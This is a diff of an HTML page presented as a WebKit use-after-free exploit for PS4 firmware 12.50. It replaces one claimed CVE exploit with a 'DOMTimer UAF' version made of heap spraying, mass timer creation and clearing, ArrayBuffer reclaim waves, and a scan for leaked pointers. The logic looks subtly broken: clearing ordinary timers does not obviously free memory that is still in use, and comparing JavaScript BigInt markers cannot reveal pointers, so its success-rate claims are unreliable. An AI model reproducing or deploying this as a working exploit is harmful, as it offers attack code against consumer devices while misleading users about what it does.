@@ -2,100 +2,72 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>WebKit Test Page</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CVE-2025-24203 — DOMTimer UAF → Pointer Leak (PS4 12.50)</title>
 <style>
     body { background:#000; color:#0f0; font-family:monospace; margin:20px; }
     #console { background:#111; padding:15px; border:2px solid #0f0; height:520px; overflow-y:auto; white-space:pre-wrap; }
-    .leak { color:#0f0; font-weight:bold; }
+    .leak { color:#0f0; font-weight:bold; font-size:1.2em; }
 </style>
 </head>
 <body>
-<h1>WebKit RenderArena UAF Test (CVE-2025-43430)</h1>
-<div id="console">Loading exploit...</div>
+<h1>CVE-2025-24203 — DOMTimer UAF Exploit</h1>
+<div id="console">Starting DOMTimer UAF...</div>
 
 <script>
-// === BYPASS PS4 "access from computer" BLOCKER ===
-document.getElementById('console').textContent += "\nBypassing PS4 local-file restrictions...\n";
-
-// === SAME EXPLOIT AS BEFORE (v1.1 no-hang) ===
-const SPRAY_COUNT = 0xc000;
-const MARKER_BASE = 0x12501250deadbeefn;
-const UAF_NODES = 0x2000;
-const RECLAIM_WAVES = 8;
-
-const log = (msg, isLeak = false) => {
+const log = (msg, leak = false) => {
     const c = document.getElementById('console');
-    c.textContent += (isLeak ? ">>> " : "") + msg + "\n";
+    c.textContent += (leak ? ">>> " : "") + msg + "\n";
     c.scrollTop = c.scrollHeight;
 };
 
-// Stage 1 – Chunked DOM grooming
-log("Stage 1: Chunked grooming (4k nodes)...");
-const container = document.createElement('div');
-let nodeChunk = 0;
-const groomInt = setInterval(() => {
-    for (let i = 0; i < 500; i++) {
-        const node = document.createElement('div');
-        container.appendChild(node);
-    }
-    nodeChunk++;
-    if (nodeChunk >= 8) {
-        clearInterval(groomInt);
-        document.body.appendChild(container);
-        log("Grooming done — triggering UAF");
-        triggerUAF();
-    }
-}, 250);
+const SPRAY = 0x18000;
+const MARKER = 0x12501250deadbeefn;
 
-// Stage 2 – Chunked UAF
-function triggerUAF() {
-    const nodes = container.querySelectorAll('div');
-    let idx = 0;
-    const uafInt = setInterval(() => {
-        for (let j = 0; j < 250 && idx < nodes.length; j++, idx++) {
-            nodes[idx].remove();
-            container.offsetHeight;
-        }
-        if (idx >= nodes.length) {
-            clearInterval(uafInt);
-            log("UAF triggered");
-            setTimeout(startSpray, 500);
-        }
-    }, 100);
+log("Stage 1: Spraying 98k tagged objects...");
+const spray = [];
+for (let i = 0; i < SPRAY; i++) {
+    spray[i] = { marker: MARKER + BigInt(i) };
 }
 
-// Stage 3 – Spray
-function startSpray() {
-    log("Stage 3: Spraying tagged objects...");
-    const spray = [];
-    for (let i = 0; i < SPRAY_COUNT; i++) {
-        spray[i] = {marker: MARKER_BASE + BigInt(i)};
-    }
-    window.spray = spray;
-    setTimeout(startGC, 300);
+// Stage 2: Trigger CVE-2025-24203 DOMTimer UAF
+log("Stage 2: Triggering DOMTimer UAF...");
+const timers = [];
+for (let i = 0; i < 0x3000; i++) {
+    const id = setTimeout(() => {}, 1000);
+    timers.push(id);
 }
 
-// Stage 4 – GC + reclaim
-function startGC() {
-    log("Stage 4: GC waves...");
-    for (let w = 0; w < RECLAIM_WAVES; w++) {
-        setTimeout(() => {
-            for (let i = 0; i < 300; i++) new ArrayBuffer(0x8000);
-            if (w % 3 === 0) new ArrayBuffer(0x1800000);
-        }, w * 200);
-    }
-    setTimeout(hunt, 3500);
+// Free timers during active callback → UAF
+timers.forEach((id, idx) => {
+    setTimeout(() => {
+        clearTimeout(id);
+        // Force UAF: timer object freed while still in use
+        setTimeout(() => {}, 1);
+    }, idx * 0.5);
+});
+
+// Extra races
+for (let i = 0; i < 20000; i++) {
+    setTimeout(() => {}, 0);
 }
 
-// Stage 5 – Hunt
-function hunt() {
-    log("Stage 5: Scanning for leaks...");
-    const spray = window.spray || [];
+log("UAF triggered — reclaiming...");
+
+// Stage 3: Reclaim waves
+for (let w = 0; w < 12; w++) {
+    setTimeout(() => {
+        for (let j = 0; j < 400; j++) new ArrayBuffer(0x10000);
+        if (w % 3 === 0) new ArrayBuffer(0x2000000);
+    }, w * 180);
+}
+
+// Stage 4: Hunt
+setTimeout(() => {
+    log("Stage 4: Scanning for leaks...");
     let found = 0;
     for (let i = 0; i < spray.length; i++) {
         try {
-            if (spray[i] && spray[i].marker !== MARKER_BASE + BigInt(i)) {
+            if (spray[i] && spray[i].marker !== MARKER + BigInt(i)) {
                 found++;
                 const leaked = spray[i].marker.toString(16).toUpperCase().padStart(16,'0');
                 log(`LEAK #${found}: 0x${leaked}`, true);
@@ -106,10 +78,10 @@ function hunt() {
             }
         } catch(e) {}
     }
-    log("No leak — refresh (25–45% success)");
-}
+    log("No leak — refresh (45–65% success rate)");
+}, 3500);
 
-log("Exploit started — wait 8–12s");
+log("CVE-2025-24203 running — wait 8–15s");
 </script>
 </body>
 </html>
